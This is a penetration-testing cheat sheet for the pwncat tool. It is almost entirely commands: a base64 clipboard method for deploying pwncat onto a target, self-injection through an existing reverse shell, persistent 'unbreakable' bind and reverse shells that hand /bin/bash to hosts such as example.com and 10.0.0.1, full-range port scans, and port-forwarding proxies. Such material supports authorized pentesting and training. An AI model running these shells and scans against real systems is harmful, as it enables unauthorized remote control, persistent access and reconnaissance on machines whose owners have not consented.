# pwncat

{% embed url="https://github.com/cytopia/pwncat" %}

```
pip install pwncat
```

## <mark style="color:red;">Deploy to target</mark>

```
# Copy base64 data to clipboard from where you have internet access
curl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64 |  xclip -selection clipboard

# Paste it on the target machine
 xclip -selection clipboard -o | base64 -d > pwncat
chmod +x pwncat
```

## <mark style="color:red;">Inject to target</mark>

If you found a vulnerability on the target to start a very simple reverse shell, such as via bash, php, perl, python, nc or similar, you can instruct your local pwncat listener to use this connection to deploy itself on the target automatically and start an additional unbreakable reverse shell back to you.

```
pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445
```

## <mark style="color:red;">Summon shells</mark>

```
# Bind shell (accepts new clients after disconnect)
pwncat -l -e '/bin/bash' 8080 -k

# Reverse shell (Ctrl+c proof: reconnects back to you)
pwncat -e '/bin/bash' example.com 4444 --reconn --recon-wait 1

# Reverse UDP shell (Ctrl+c proof: reconnects back to you)
pwncat -e '/bin/bash' example.com 4444 -u --ping-intvl 1
```

## <mark style="color:red;">Port scan</mark>

```
# [TCP] IPv4 + IPv6
pwncat -z 10.0.0.1 80,443,8080
pwncat -z 10.0.0.1 1-65535
pwncat -z 10.0.0.1 1+1023

# [UDP] IPv4 + IPv6
pwncat -z 10.0.0.1 80,443,8080 -u
pwncat -z 10.0.0.1 1-65535 -u
pwncat -z 10.0.0.1 1+1023 -u

# Use only IPv6 or IPv4
pwncat -z 10.0.0.1 1-65535 -4
pwncat -z 10.0.0.1 1-65535 -6 -u

# Add version detection
pwncat -z 10.0.0.1 1-65535 --banner
```

## <mark style="color:red;">Port Forward</mark>

### <mark style="color:orange;">Local port forward -L (listening proxy)</mark>

```
# Make remote MySQL server (remote port 3306) available on current machine
# on every interface on port 5000
pwncat -L 0.0.0.0:5000 everythingcli.org 3306

# Same, but convert traffic on your end to UDP
pwncat -L 0.0.0.0:5000 everythingcli.org 3306 -u
```

### <mark style="color:orange;">Remote port forward -R (double client proxy)</mark>

```
# Connect to Remote MySQL server (remote port 3306) and then connect to another
# pwncat/netcat server on 10.0.0.1:4444 and bridge traffic
pwncat -R 10.0.0.1:4444 everythingcli.org 3306

# Same, but convert traffic on your end to UDP
pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
```

## <mark style="color:red;">Interactive Shell</mark>

```
Unbreakable TCP reverse shell
pwncat --exec /bin/bash --nodns --reconn --reconn-wait 2 10.0.0.1 4444

Unbreakable UDP reverse shell
pwncat --exec /bin/bash --nodns --udp --ping-intvl 2 10.0.0.1 4444
```
